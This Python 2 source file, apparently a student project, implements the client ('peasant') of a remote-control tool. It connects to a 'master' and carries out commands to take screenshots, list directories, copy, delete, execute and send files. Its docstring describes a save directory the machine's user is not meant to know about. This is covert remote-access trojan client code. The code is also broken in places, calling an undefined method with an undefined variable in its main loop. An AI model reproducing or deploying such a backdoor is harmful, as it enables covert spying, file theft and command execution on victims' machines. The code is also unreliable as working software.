# Tal's Peasant Class
# Version 5 - 14.2.19

import os
import socket
from select import select
from commands import Commands


class Peasant(object):
    def __init__(self, ip='127.0.0.1', port='8220', save_dir='C:\\peasant\\', debug=False):
        """
        Create a new peasant
        :param ip: the ip of the master
        :param port: the port of the master socket
        :param save_dir: (a path to) the directory to save the photos and more. The
               master own directory that the peasant's user shouldn't know about.
        :param debug: debug mode (True-on, False-off)
        """
        # open a TCP\IP socket
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # get the commands from the commands
        self.__commands = Commands.get_commands()
        # the masters' ip
        self.__IP = ip
        # the masters' port
        self.__PORT = port
        # a list of all the request to handle
        self.__requests = []
        # a list of all the responses to send to the master
        self.__responses = []
        # the path to the dir to save all the screenshots
        self.__save_dir = save_dir
        # current working directory
        self.__cwd = 'C:\\'
        # debug mode
        self.__DEBUG = debug

    def __receive_request(self):
        """
        Receives the full message sent by the master.
        :return: nothing, void.
        """
        request_size = int(self.__socket.recv(Commands.SIZE_LENGTH))
        request = self.__socket.recv(request_size)
        # split the request into a list by spaces
        request_list = request.split(Commands.SEPARATE_CHAR)
        # get the command (as a string)
        command = request_list[0]
        # get the parameters as a list (no parameters = empty list)
        params = request_list[1:]
        # if debug mode on, print the command and parameters
        if self.__DEBUG:
            print command + ":", str(params)
        # add the command and parameters as a tuple to the requests list
        self.__requests.append((command, params))

    def __check_master_request(self, command, params):
        """
        Check if the params are valid.
        :param command: the client's command
        :param params: the client's parameters
        :return: (valid, error_msg)
                    valid: True/False
                    error_msg: None if all is OK, otherwise some error message
        """
        # a local variable to check if the request is valid
        valid = True
        error_msg = 'None'
        # if the command is not a known command
        if command not in self.__commands.keys():
            error_msg = "'%s' Is Not a valid command" % command
            valid = False
        # a known command, check the parameters
        elif command == 'COPY':
            # if there are two parameters
            if not len(params) == 2:
                error_msg = "There are should be 2 parameters for the '%s' command" % command
                valid = False
            elif not os.path.isfile(params[0]):
                error_msg = "The first parameter of '%s' should be an existing file (in the peasant machine)" % command
                valid = False
        elif command == 'TAKE_SCREENSHOT' or command == 'EXIT':
            if not len(params) == 0:
                error_msg = "'%s' command should have 0 parameters" % command
                valid = False
        elif command == 'DIR':
            if not len(params) == 1:
                error_msg = "'%s' command should have 1 parameter" % command
                valid = False
            elif not os.path.isdir(params[0]):
                error_msg = "The first parameter of '%s' command should be a directory" % command
                valid = False
        elif command == 'DELETE' or command == 'EXECUTE' or command == 'SEND_FILE':
            if not len(params) == 1:
                error_msg = "'%s' command should have 1 parameter" % command
                valid = False
            elif not os.path.isfile(params[0]):
                error_msg = "The first parameter of '%s' should be an existing file (in the peasant machine)" % command
                valid = False

        return valid, error_msg

    def __handle_master_request(self, command, params):
        """
        Create the response to the master, given the command is legal and params are valid
        :param command: the master's command as a string
        :param params: the master's parameters as a list
        :return: a response to the master request
        """
        return self.__commands[command](*params)

    def __handle_requests(self):
        """
        Handles all the requests that got from the master.
        :return: nothing, void.
        """
        # create a copy of the requests
        requests = self.__requests
        # for every request
        for request in requests:
            # get the request's command and parameters
            command, params = request
            # debug
            if self.__DEBUG:
                print "Handling the following request:\n"
                print "Command: %s\nParams: %s" % (str(command), str(params))
            # handle the request
            response = self.__handle_master_request(command, params)
            # add the response to the responses list
            self.__responses.append(response)
            # remove the request from the requests' list
            if request in self.__requests:
                self.__requests.remove(request)

    def __send_responses(self):
        """
        Sends all the responses to the master.
        :return: nothing, void.
        """
        # create a copy of the responses
        responses = self.__responses
        # for every response
        for response in responses:
            if self.__DEBUG:
                print "Sending the following response to the master:\n"
                print str(response)
            # get the response's length
            length = Commands.pad_length(len(response))
            # send the master the response
            self.__socket.send(length+response)
            # remove the response from the responses' list
            if response in self.__responses:
                self.__responses.remove(response)

    def run(self):
        """
        Runs the peasant - connect to the master and receive commands,
        execute them and send results to the master.
        :return: nothing, void.
        """
        # connect to the master
        self.__socket.connect((self.__IP, self.__PORT))

        # the master command
        command = ""
        # while the master didn't close the connection with the peasant
        # and there aren't any requests to handle
        # and there aren't any responses to send to the master
        while not (command.upper() == 'EXIT' and len(self.__responses) == 0 and len(self.__requests) == 0):
            # select - check if can receive or send to the master
            rlist, wlist, xlist = select([self.__socket], [self.__socket], [])

            # if can receive from the master a command
            if self.__socket in rlist:
                # receive the master's request
                self.__receive_request()

            # handle all the current requests
            self.__handle_requests()

            # if can send responses to the master, send them.
            if self.__socket in wlist:
                # send the response to the master
                self.send_response_to_master(response)

        # close the connection and the socket
        self.__socket.close()


if __name__ == '__main__':
    # create a new peasant
    peasant = Peasant()
    # run the peasant
    peasant.run()
